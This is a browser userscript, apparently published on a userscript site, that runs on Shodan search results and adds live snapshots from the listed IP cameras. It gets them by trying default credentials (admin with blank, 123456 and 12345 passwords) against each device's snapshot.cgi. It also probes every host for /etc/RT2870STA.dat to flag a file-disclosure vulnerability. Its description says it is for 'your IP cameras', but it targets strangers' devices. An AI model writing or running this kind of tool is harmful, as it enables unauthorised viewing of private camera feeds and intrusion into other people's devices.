// ==UserScript==
// @name         Shodan Cam Helper
// @namespace    http://ebaumsworld.com/
// @version      0.1
// @description  Adds snapshots for your IP cameras
// @author       joe
// @match        https://www.shodan.io/search?query*
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/25209/Shodan%20Cam%20Helper.user.js
// @updateURL https://update.greasyfork.org/scripts/25209/Shodan%20Cam%20Helper.meta.js
// ==/UserScript==
 
var ENABLED_LOGGABLE_VIDEOSTREAM = false;
var ENABLED_SNAPSHOT = true;
var ENABLED_TRAVERSAL = true;
var IPs = [];
 
addCredentials = function(type, username, password, url)
{
	if(type == 1)
	{ // add at http
		return url.replace("http://", "http://" + username + ":" + password + "@");
	}
	else
	{
		if(url.indexOf("?") > 0)
		{
			url += "&";
		}
		else
		{
			url += "?";
		}
		return url + "user=" + username + "&pwd=" + password;
	}
}


var shodanIPs = document.getElementsByClassName("ip");
var i = 0;
for(i = 0; i < shodanIPs.length; i++)
{
	var url = shodanIPs[i].getElementsByTagName("a")[0].href;
	var videostream =  addCredentials(1, "admin", "", url + "videostream.cgi");
	var snapshot = addCredentials(2, "admin", "", url + "snapshot.cgi");
	var snapshot2 = addCredentials(2, "admin", "123456", url + "snapshot.cgi");
	var snapshot3 = addCredentials(2, "admin", "12345", url + "snapshot.cgi");
   
	var addition = "<br />";
   
	if(ENABLED_LOGGABLE_VIDEOSTREAM)
	{
		addition += "Loggable: <img src=\"" + videostream + "\" /><br />";
	}
	if(ENABLED_SNAPSHOT)
	{
		addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot + "\" /><br />";
		addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot2 + "\" /><br />";
		addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot3 + "\" /><br />";
	}
    if(ENABLED_TRAVERSAL)
    {
        addition += "<div class=\"" + url + "\"> </div>";
        IPs.push(url);
    }
   
	shodanIPs[i].innerHTML += addition;
}

function checkVulnerability()
{
    if(IPs.length > 0)
    {
        var currentIP = IPs.pop();
        GM_xmlhttpRequest({
            url: currentIP + "/etc/RT2870STA.dat",
            method: "GET",
            onload: function(response) {
                var text = "";
                if(response.status == "200")
                {
                    text = "<b><u>Vulnerable to //proc/kcore!</u></b>";
                }
                else
                {
                    text = "Not vulnerable?";
                }
                document.getElementsByClassName(currentIP)[0].innerHTML = text;
                checkVulnerability();
            }
        });
    }
}

checkVulnerability();